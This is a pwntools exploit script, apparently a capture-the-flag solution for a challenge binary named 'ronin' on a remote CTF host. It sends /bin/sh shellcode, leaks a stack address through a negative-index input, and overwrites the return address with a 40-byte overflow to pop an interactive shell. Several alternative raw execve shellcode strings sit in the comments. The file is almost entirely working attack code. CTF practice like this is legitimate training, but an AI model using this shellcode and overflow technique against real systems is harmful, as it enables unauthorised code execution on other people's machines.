#!/usr/bin/env python3

from pwn import *

exe = ELF("./ronin")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                b *encounter+79
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13372)

    return r


def main():
    r = conn()

    ret = exe.symbols['chase']
    log.info(f"{ret=:02x}")

    # shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    # shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
    # shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
    # shellcode = asm(shellcraft.sys)
    shellcode = asm(shellcraft.amd64.linux.sh())
    log.info(f"{len(shellcode)}")

    # r.send(b'C'*80)
    r.sendline(b'Chase after it.' + shellcode)

    r.recvuntil(b'Which way will you look?')
    r.sendline(b'-4')
    r.recv(1)
    b = r.recv(timeout=300)
    num = int.from_bytes(b, 'little')
    log.info(f"{num=:02x}")

    # offset = 224
    offset = 65

    r.sendline(b'2')
    r.sendline(b'A'*40 + p64(num - offset))
    # r.sendline(shellcode.rjust(40, b'A') + p64(ret))

    # log.info(r.recvline())

    # log.info(r.recvuntil(b'inner strength'))
    # log.info(r.recvuntil(b'hours.'))
    # log.info(r.recvline())
    # r.sendline(b'-2')
    # x = bytes.fromhex(r.recvline().strip().decode().replace(b'\\x', b''))
    # log.info(f"{x=:02x}")

    # r.sendline(b'2')
    # r.sendline(shellcode.rjust(40, b'A') + p64(ret))
    # r.sendline(b'ABCDEFGHIJKLMLNOPQRSTUVWXZ')

    r.interactive()


if __name__ == "__main__":
    main()
